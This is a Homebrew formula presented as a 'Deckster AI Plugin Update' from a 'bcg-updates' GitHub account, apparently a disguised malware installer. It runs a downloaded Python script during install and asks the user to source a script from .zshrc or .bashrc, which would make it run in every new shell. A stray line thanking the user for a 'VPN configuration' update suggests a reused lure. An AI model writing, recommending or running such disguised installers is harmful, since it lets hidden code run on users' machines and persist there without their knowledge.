class DecksterAiPlugin < Formula
  desc "Deckster AI Plugin Update"
  homepage "https://github.com/bcg-updates/"
  url "https://github.com/bcg-updates/homebrew-deckster-ai/releases/download/v1.3/deckster-ai-plugin-1.3.tar.gz"
  sha256 "efdd3fd1fae28f0e0dd90b0b5cb0692d074cf905bd9a2af765ea75ccb164a2cb"
  version "1.3"
  depends_on "python@3.12"

  def install
    libexec.install Dir["*"]
    system "/opt/homebrew/opt/python@3.12/bin/python3.12 -m venv --system-site-packages --without-pip #{libexec}"
    system "#{libexec}/bin/python -m ensurepip"
    system "#{libexec}/bin/python -m pip install pyobjc"
    system "#{libexec}/bin/python #{libexec}/deckster-ai-plugin.py"
  end

  def caveats
    <<~EOS
    To finish installation, add the following line to .zshrc or .bashrc  
  source #{libexec}/completion.sh
Then reopen your terminal app. Thank you for updating your VPN configuration.
    EOS
  end
end
